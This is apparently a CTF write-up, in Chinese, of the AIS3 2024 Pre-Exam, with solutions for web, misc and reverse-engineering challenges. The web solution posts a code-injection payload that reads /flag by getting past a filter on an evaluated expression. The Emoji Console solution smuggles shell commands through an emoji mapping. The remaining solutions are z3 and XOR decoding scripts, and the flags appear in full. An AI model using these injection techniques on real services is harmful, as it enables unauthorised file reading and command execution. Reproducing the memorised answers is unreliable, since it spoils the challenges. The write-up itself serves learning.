---
title: AIS3 2024 Pre-Exam Writeup
date: 2024-06-08 20:43:15
tags: ['CTF']
categories: ['Competition']
description: AIS3 2024 Pre-Exam 解題記錄
---

## Web

### Evil Calculator 

後端只有擋空格與底線使用open function即可bypass

```bash
curl --header "Content-Type: application/json" \
  --request POST \
  --data "@payload" \
  http://chals1.ais3.org:5001/calculate
```

payload
```json
{
    "expression": "open('/flag').read()"
}
```
flag: `AIS3{7RiANG13_5NAK3_I5_50_3Vi1}`

## Misc

### Three Dimensional Secret 

pcapng檔後段有給3DP用的Marlin G-code
丟給Cura或Online G-code Viewer會得到如下圖之結果

![image](decompile.png)
flag: `AIS3{b4d1y_tun3d_PriN73r}`

### Emoji Console 

每一個emoji對應一組符號 利用🐱 ⭐可組合出`cat *`將後端原始碼印出
搭配對照表利用💿 🚩😓😑 🐱 ⭐湊成`cd flag;/:| cat *`輸出`flag-printer.py`

```py
#flag-printer.py

print(open('/flag','r').read())
```

將後半段替換成🐍 ⭐(`cd flag;/:| python *`) 🉐 flag
flag: `AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}`

## Reverse

### The Long Print

依照decompile的結果去除delay的部分照寫一遍即可解出flag

![image](gcode.png)

```python
secret = b'\x46\x41\x4b\x45\x0b\x00\x00\x00\x7b\x68\x6f\x6f\x0a\x00\x00\x00\x72\x61\x79\x5f\x02\x00\x00\x00\x73\x74\x72\x69\x08\x00\x00\x00\x6e\x67\x73\x5f\x06\x00\x00\x00\x69\x73\x5f\x61\x05\x00\x00\x00\x6c\x77\x61\x79\x07\x00\x00\x00\x73\x5f\x61\x6e\x04\x00\x00\x00\x5f\x75\x73\x65\x09\x00\x00\x00\x66\x75\x6c\x5f\x00\x00\x00\x00\x63\x6f\x6d\x6d\x01\x00\x00\x00\x61\x6e\x7a\x7d\x03\x00\x00\x00'

key = b'\x01\x10\x01\x3a\x0d\x1b\x4c\x4c\x2d\x00\x0b\x3a\x40\x4f\x45\x00\x1a\x32\x04\x31\x1d\x16\x2d\x3e\x31\x0a\x12\x2c\x03\x11\x3e\x0d\x2c\x00\x1a\x0c\x32\x14\x1d\x04\x00\x31\x00\x1a\x07\x08\x18'

secret_list = []
key_list = []

for i in range(0, len(secret), 4):
    secret_list.append(int.from_bytes(secret[i:i+4], "little"))
for i in range(0, len(key), 4):
    key_list.append(int.from_bytes(key[i:i+4], "little"))

flag = ""

mask = (1 << 8) - 1

for i in range(0, 24, 2):
    chunk = key_list[secret_list[i+1]] ^ secret_list[i]
    for j in range(4):
        flag += chr((chunk >> (j * 8)) & mask)
print(flag)
```

flag: `AISE{You_are_the_master_of_time_management!!!!?}`

### 火拳のエース 

輸入字串在經過`xor_strings` function後讓每個buffer的字元用以下`complex_function`內的運算進行處理後再與設定之密文進行比較

![image](decompile2.png)

可利用z3求解如下所示

```python
from z3 import *

index = []
index.append([i for i in range(8)])
index.append([i + 0x20 for i in range(8)])
index.append([i + 0x40 for i in range(8)])
index.append([i + 0x60 for i in range(8)])

key = []
key.append(b'\x0e\x0d\x7d\x06\x0f\x17\x76\x04')
key.append(b'\x6d\x00\x1b\x7c\x6c\x13\x62\x11')
key.append(b'\x1e\x7e\x06\x13\x07\x66\x0e\x71')
key.append(b'\x17\x14\x1d\x70\x79\x67\x74\x33')

secret = []
secret.append("DHLIYJEG")
secret.append("MZRERYND")
secret.append("RUYODBAH")
secret.append("BKEMPBRE")

for ind, k, sec in zip(index, key, secret):
    result = []
    for i, c in enumerate(sec):
        x = Int("x")
        s = Solver()
        s.add(x > 0x40, x < 0x5b)
        offset = ord(c) - 0x41
        ivar = ind[i] % 3 + 3
        if ind[i] % 3 == 0:
            s.add((((x - 0x41 + ind[i] * 0x11) % 0x1a) * ivar + 7) % \
                  0x1a == offset)
        elif ind[i] % 3 == 1:
            s.add((ivar * 2 + ((x - 0x41 + ind[i] * 0x11) % 0x1a)) % \
                  0x1a == offset)
        elif ind[i] % 3 == 2:
            s.add(((((x - 0x41 + ind[i] * 0x11) % 0x1a) - ivar) + 0x1a) % \
                  0x1a == offset)
        s.check()
        m = s.model()
        result.append(m[x].as_long())
        # print(m[x].as_long())
    
    for i, r in enumerate(result):
        print(chr(k[i] ^ r), end="")
print()

```

flag: `AIS3{G0D_D4MN_4N9R_15_5UP3R_P0W3RFU1!!!}`
